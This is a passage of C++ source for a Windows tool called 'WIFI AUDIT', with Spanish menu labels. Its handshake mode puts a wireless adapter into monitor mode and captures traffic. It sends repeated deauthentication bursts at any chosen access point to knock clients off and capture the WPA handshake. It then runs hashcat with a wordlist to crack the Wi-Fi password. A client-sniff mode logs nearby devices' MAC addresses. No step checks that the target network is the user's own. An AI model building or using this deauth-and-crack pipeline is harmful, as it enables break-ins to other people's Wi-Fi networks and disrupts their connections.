    if (r == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        rc = 0xDEAD;
    } else {
        GetExitCodeProcess(pi.hProcess, &rc);
    }
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return (int)rc;
}

static HANDLE run_async(const std::string& cmd) {
    STARTUPINFOA si{};
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi{};
    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back('\0');
    if (!CreateProcessA(nullptr, buf.data(), nullptr, nullptr, FALSE,
                        CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
        return nullptr;
    CloseHandle(pi.hThread);
    return pi.hProcess;
}

static std::string run_capture(const std::string& cmd, DWORD timeout_ms = 30000) {
    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    HANDLE rPipe = nullptr, wPipe = nullptr;
    if (!CreatePipe(&rPipe, &wPipe, &sa, 0)) return {};
    SetHandleInformation(rPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = wPipe;
    si.hStdError  = wPipe;
    PROCESS_INFORMATION pi{};
    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back('\0');
    BOOL ok = CreateProcessA(nullptr, buf.data(), nullptr, nullptr, TRUE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    CloseHandle(wPipe);
    if (!ok) {
        CloseHandle(rPipe);
        return {};
    }

    std::string out;
    char tmp[4096];
    DWORD read;
    DWORD start = GetTickCount();
    while (true) {
        DWORD avail = 0;
        if (PeekNamedPipe(rPipe, nullptr, 0, nullptr, &avail, nullptr) && avail) {
            if (!ReadFile(rPipe, tmp, sizeof(tmp) - 1, &read, nullptr) || read == 0)
                break;
            tmp[read] = 0;
            out += tmp;
        } else {
            DWORD r = WaitForSingleObject(pi.hProcess, 50);
            if (r == WAIT_OBJECT_0) {
                while (PeekNamedPipe(rPipe, nullptr, 0, nullptr, &avail, nullptr) && avail) {
                    if (!ReadFile(rPipe, tmp, sizeof(tmp)-1, &read, nullptr) || read == 0) break;
                    tmp[read] = 0;
                    out += tmp;
                }
                break;
            }
            if (GetTickCount() - start > timeout_ms) break;
        }
    }
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hProcess);
    CloseHandle(rPipe);
    return out;
}

// ============================================================
// handshake pipeline
// ============================================================

static void collect_handshake(Report& r, const fs::path& base,
                              const std::string& ssid,
                              const std::string& bssid,
                              int channel,
                              const std::string& wordlist) {
    auto& s = r.text_section("handshake pipeline");
    s.text_lines.push_back("  target ssid    : " + ssid);
    s.text_lines.push_back("  target bssid   : " + bssid);
    s.text_lines.push_back("  target channel : " + std::to_string(channel));
    s.text_lines.push_back("");

    std::string dumpcap    = which("dumpcap");
    std::string hcxtool    = which("hcxpcapngtool");
    std::string hashcat    = which("hashcat");
    std::string wlanhelper = which("WlanHelper");

    bool missing = false;
    auto check = [&](const std::string& name, const std::string& path) {
        if (path.empty()) {
            s.text_lines.push_back("  [!] missing in PATH: " + name);
            missing = true;
        } else {
            s.text_lines.push_back("  [ok] " + name + " -> " + path);
        }
    };
    check("dumpcap", dumpcap);
    check("hcxpcapngtool", hcxtool);
    check("hashcat", hashcat);
    check("WlanHelper", wlanhelper);
    if (!file_exists(wordlist))
        s.text_lines.push_back("  [!] wordlist not found: " + wordlist);
    if (missing) {
        s.text_lines.push_back("");
        s.text_lines.push_back("  install: Npcap + Wireshark + hcxtools + hashcat");
        s.text_lines.push_back("  WlanHelper ships with Npcap SDK or Wireshark extcap");
        return;
    }

    fs::create_directories(base / "Handshakes");
    fs::path pcap = base / "Handshakes" / (ssid + "_" + fs_timestamp() + ".pcap");
    fs::path hc22000 = base / "Handshakes" / (ssid + "_" + fs_timestamp() + ".hc22000");

    std::string list = run_capture("\"" + dumpcap + "\" -D", 8000);
    std::string adapter;
    {
        std::istringstream ss(list);
        std::string line;
        while (std::getline(ss, line)) {
            if (line.find("\\Device\\NPF_") != std::string::npos) {
                size_t a = line.find("\\Device\\NPF_");
                size_t b = line.find_first_of(" \t", a);
                adapter = line.substr(a, b - a);
                break;
            }
        }
    }
    if (adapter.empty()) {
        s.text_lines.push_back("  [!] no Npcap adapter found — run: dumpcap -D");
        return;
    }
    s.text_lines.push_back("  adapter        : " + adapter);
    s.text_lines.push_back("");

    s.text_lines.push_back("  [1/4] monitor mode");
    run_wait("\"" + wlanhelper + "\" " + adapter + " mode monitor", 8000);
    run_wait("\"" + wlanhelper + "\" " + adapter + " channel " + std::to_string(channel), 8000);

    s.text_lines.push_back("  [2/4] dumpcap -> " + pcap.filename().string());
    std::string cap_cmd = "\"" + dumpcap + "\" -i " + adapter +
                          " -w \"" + pcap.string() + "\" -a duration:120";
    HANDLE cap = run_async(cap_cmd);
    if (!cap) {
        s.text_lines.push_back("  [!] dumpcap failed to start");
        return;
    }

    s.text_lines.push_back("  [3/4] deauth bursts");
    for (int i = 0; i < 6; ++i) {
        std::string aireplay = which("aireplay-ng");
        if (!aireplay.empty()) {
            run_wait("\"" + aireplay + "\" --deauth 5 -a " + bssid + " " + adapter, 15000);
        } else {
            std::string mdk4 = which("mdk4");
            if (!mdk4.empty())
                run_wait("\"" + mdk4 + "\" " + adapter + " d -B " + bssid, 8000);
        }
        std::this_thread::sleep_for(std::chrono::seconds(15));
    }

    TerminateProcess(cap, 0);
    CloseHandle(cap);

    s.text_lines.push_back("  [4/4] convert + crack");
    run_wait("\"" + hcxtool + "\" -o \"" + hc22000.string() + "\" \"" + pcap.string() + "\"", 60000);

    if (!file_exists(hc22000.string())) {
        s.text_lines.push_back("  [!] no handshake captured — deauth failed or AP out of range");
        return;
    }

    s.text_lines.push_back("  running hashcat -m 22000 vs " + wordlist);
    int hrc = run_wait("\"" + hashcat + "\" -m 22000 -a 0 -w 4 --potfile-disable \"" +
                       hc22000.string() + "\" \"" + wordlist + "\" -o \"" +
                       (base / "Handshakes" / "cracked.txt").string() + "\"", 3600000);

    s.text_lines.push_back("  hashcat exit code: " + std::to_string(hrc));
    auto cracked = base / "Handshakes" / "cracked.txt";
    if (file_exists(cracked.string())) {
        std::ifstream cf(cracked);
        std::string ln;
        while (std::getline(cf, ln)) {
            s.text_lines.push_back("  CRACKED: " + ln);
        }
    } else {
        s.text_lines.push_back("  not cracked with this wordlist");
    }
}

// ============================================================
// client sniff
// ============================================================

static void collect_clients(Report& r, const fs::path& base,
                            int duration_sec) {
    auto& s = r.text_section("client sniff");
    std::string dumpcap = which("dumpcap");
    std::string tshark  = which("tshark");
    std::string wlanhelper = which("WlanHelper");
    if (dumpcap.empty() || tshark.empty() || wlanhelper.empty()) {
        s.text_lines.push_back("  [!] need dumpcap + tshark + WlanHelper in PATH");
        return;
    }

    fs::create_directories(base / "Clients");
    fs::path pcap = base / "Clients" / ("clients_" + fs_timestamp() + ".pcap");

    std::string list = run_capture("\"" + dumpcap + "\" -D", 8000);
    std::string adapter;
    {
        std::istringstream ss(list);
        std::string line;
        while (std::getline(ss, line)) {
            if (line.find("\\Device\\NPF_") != std::string::npos) {
                size_t a = line.find("\\Device\\NPF_");
                size_t b = line.find_first_of(" \t", a);
                adapter = line.substr(a, b - a);
                break;
            }
        }
    }
    if (adapter.empty()) { s.text_lines.push_back("  [!] no NPF adapter"); return; }

    run_wait("\"" + wlanhelper + "\" " + adapter + " mode monitor", 8000);

    s.text_lines.push_back("  capturing " + std::to_string(duration_sec) + "s");
    run_wait("\"" + dumpcap + "\" -i " + adapter + " -w \"" + pcap.string() +
             "\" -a duration:" + std::to_string(duration_sec), (DWORD)(duration_sec + 30) * 1000);

    std::string cmd = "\"" + tshark + "\" -r \"" + pcap.string() +
                      "\" -Y \"wlan.fc.type==0 && (wlan.fc.type_subtype==0 || wlan.fc.type_subtype==2)\""
                      " -T fields -e wlan.sa -e wlan.bssid -e wlan.ssid 2>nul";
    std::string out = run_capture(cmd, 120000);

    auto& t = r.table_section("clients by bssid", {"client_mac","bssid","ssid"});
    std::istringstream ss(out);
    std::string ln;
    while (std::getline(ss, ln)) {
        if (ln.empty()) continue;
        std::vector<std::string> f;
        std::string cur;
        for (char c : ln) {
            if (c == '\t') { f.push_back(cur); cur.clear(); }
            else if (c != '\r') cur += c;
        }
        f.push_back(cur);
        if (f.size() >= 3 && !f[0].empty())
            t.rows.push_back({f[0], f[1], f[2]});
    }
    if (t.rows.empty())
        s.text_lines.push_back("  no association frames captured");
}

// ============================================================
// formats + emit
// ============================================================

enum class Fmt { TXT, JSON, HTML };

static std::vector<Fmt> parse_fmt(const std::string& spec) {
    std::vector<Fmt> v;
    if (spec.empty()) return {Fmt::TXT};
    auto has = [&](const char* k) { return spec.find(k) != std::string::npos; };
    if (has("txt"))  v.push_back(Fmt::TXT);
    if (has("json")) v.push_back(Fmt::JSON);
    if (has("html")) v.push_back(Fmt::HTML);
    if (has("all") || (v.empty() && spec == "all")) {
        v = {Fmt::TXT, Fmt::JSON, Fmt::HTML};
    }
    if (v.empty()) v.push_back(Fmt::TXT);
    return v;
}

static void emit(Report& r, const fs::path& dir,
                 const std::vector<Fmt>& fmts) {
    fs::path base = next_report_base(dir);
    for (auto f : fmts) {
        switch (f) {
        case Fmt::TXT:  r.write_txt(base.string() + ".txt");   break;
        case Fmt::JSON: r.write_json(base.string() + ".json"); break;
        case Fmt::HTML: r.write_html(base.string() + ".html"); break;
        }
    }
    std::cout << "  -> wrote " << base.string() << ".*\n";
}

// ============================================================
// option runners
// ============================================================

static void run_option(int n, const fs::path& base, const std::vector<Fmt>& fmts,
                       const std::string& arg1 = "", const std::string& arg2 = "",
                       const std::string& arg3 = "", int argn = 0) {
    switch (n) {
    case 1: {
        Report r("MY WIFI AUDIT");
        collect_my_wifi(r);
        emit(r, base / "MiWIfi", fmts);
        break;
    }
    case 2: {
        Report r("NEIGHBOR WIFI SCAN");
        collect_neighbors(r);
        emit(r, base / "Near Wifis", fmts);
        break;
    }
    case 3: {
        Report r("MY WIFI + NEIGHBORS");
        auto& s1 = r.text_section("part 1 — my wifi"); (void)s1;
        collect_my_wifi(r);
        auto& s2 = r.text_section("part 2 — neighbors"); (void)s2;
        collect_neighbors(r);
        emit(r, base / "MiWIfi and Near Wifis", fmts);
        break;
    }
    case 4: {
        Report r("CHANNEL ANALYSIS");
        collect_channels(r);
        emit(r, base / "Channels", fmts);
        break;
    }
    case 5: {
        Report r("RSSI HISTORY");
        collect_history(r, base);
        emit(r, base / "History", fmts);
        break;
    }
    case 6: {
        Report r("HANDSHAKE CAPTURE");
        collect_handshake(r, base, arg1, arg2, argn, arg3);
        emit(r, base / "Handshakes", fmts);
        break;
    }
    case 7: {
        Report r("CLIENT SNIFF");
        collect_clients(r, base, argn > 0 ? argn : 60);
        emit(r, base / "Clients", fmts);
        break;
    }
    default:
        std::cout << "  ?\n";
    }
}

// ============================================================
// CLI
// ============================================================

struct CliOpts {
    int option = 0;
    std::string fmt = "txt";
    std::string out = "Results";
    std::string ssid, bssid, wordlist = "rockyou.txt";
    int channel = 0;
    int duration = 60;
    bool help = false;
};

static bool parse_cli(int argc, char** argv, CliOpts& o) {
    for (int i = 1; i < argc; ++i) {
        std::string a = argv[i];
        auto next = [&]() -> std::string {
            if (i + 1 < argc) return argv[++i];
            return {};
        };
        if      (a == "--my")        o.option = 1;
        else if (a == "--neighbors") o.option = 2;
        else if (a == "--both")      o.option = 3;
        else if (a == "--channels")  o.option = 4;
        else if (a == "--history")   o.option = 5;
        else if (a == "--handshake") o.option = 6;
        else if (a == "--clients")   o.option = 7;
        else if (a == "--format")    o.fmt = next();
        else if (a == "--out")       o.out = next();
        else if (a == "--ssid")      o.ssid = next();
        else if (a == "--bssid")     o.bssid = next();
        else if (a == "--wordlist")  o.wordlist = next();
        else if (a == "--channel")   o.channel = std::atoi(next().c_str());
        else if (a == "--duration")  o.duration = std::atoi(next().c_str());
        else if (a == "--help" || a == "-h") o.help = true;
        else if (!a.empty() && a[0] != '-') o.out = a;
    }
    return o.option != 0 || o.help;
}

static void print_help() {
    std::cout <<
        "wifiaudit --my             scan my wifi\n"
        "wifiaudit --neighbors      scan neighbors\n"
        "wifiaudit --both           both\n"
        "wifiaudit --channels       channel analysis\n"
        "wifiaudit --history        rssi history\n"
        "wifiaudit --handshake --ssid NAME --bssid MAC --channel N --wordlist FILE\n"
        "wifiaudit --clients --duration N\n"
        "\n"
        "  --format txt,json,html,all   (default: txt)\n"
        "  --out DIR                    (default: Results)\n";
}

// ============================================================
// menu
// ============================================================

static void banner() {
    std::cout <<
        "\n"
        "  ============================================\n"
        "   WIFI AUDIT  v2.1\n"
        "  ============================================\n"
        "   1) MI WIFI              -> Results\\MiWIfi\\\n"
        "   2) WIFIS CERCANAS       -> Results\\Near Wifis\\\n"
        "   3) AMBAS                -> Results\\MiWIfi and Near Wifis\\\n"
        "   4) ANALISIS DE CANALES  -> Results\\Channels\\\n"
        "   5) HISTORICO RSSI       -> Results\\History\\\n"
        "   6) HANDSHAKE     [hw]   -> Results\\Handshakes\\\n"
        "   7) CLIENTES      [hw]   -> Results\\Clients\\\n"
        "   0) SALIR\n"
        "  --------------------------------------------\n";
}

static void menu_handshake(const fs::path& base, const std::vector<Fmt>& fmts) {
    std::cout << "  ssid     : ";
    std::string ssid; std::getline(std::cin, ssid);
    std::cout << "  bssid    : ";
    std::string bssid; std::getline(std::cin, bssid);
    std::cout << "  channel  : ";
    std::string ch; std::getline(std::cin, ch);
    std::cout << "  wordlist (default rockyou.txt): ";
    std::string wl; std::getline(std::cin, wl);
    if (wl.empty()) wl = "rockyou.txt";
    run_option(6, base, fmts, ssid, bssid, wl, std::atoi(ch.c_str()));
}

static void menu_loop(const fs::path& base, const std::vector<Fmt>& fmts) {
    for (;;) {
        banner();
        std::cout << "  choice: ";
        std::string line;
        if (!std::getline(std::cin, line)) break;
        if (line.empty()) continue;

        switch (line[0]) {
        case '1': case '2': case '3': case '4': case '5':
            run_option(line[0] - '0', base, fmts);
            break;
        case '6': menu_handshake(base, fmts); break;
        case '7': run_option(7, base, fmts, "", "", "", 60); break;
        case '0': return;
        default:  std::cout << "  ?\n";
        }
        std::cout << "\n";
    }
}

// ============================================================
// main
// ============================================================

int main(int argc, char** argv) {
    SetConsoleOutputCP(CP_UTF8);

    CliOpts cli;
    bool is_cli = parse_cli(argc, argv, cli);
    if (cli.help) { print_help(); return 0; }

    fs::path base = is_cli ? cli.out : "Results";
    auto fmts = parse_fmt(is_cli ? cli.fmt : "txt");

    std::error_code ec;
    fs::create_directories(base, ec);
    std::cout << "base directory: " << fs::absolute(base).string() << "\n";

    if (!is_admin())
        std::cout << "[!] not elevated — saved keys will be blank. "
                     "relaunch as administrator for full output.\n";

    if (is_cli) {
        run_option(cli.option, base, fmts,
                   cli.ssid, cli.bssid, cli.wordlist,
                   cli.option == 6 ? cli.channel : cli.duration);
        return 0;
    }

    menu_loop(base, fmts);
    return 0;
}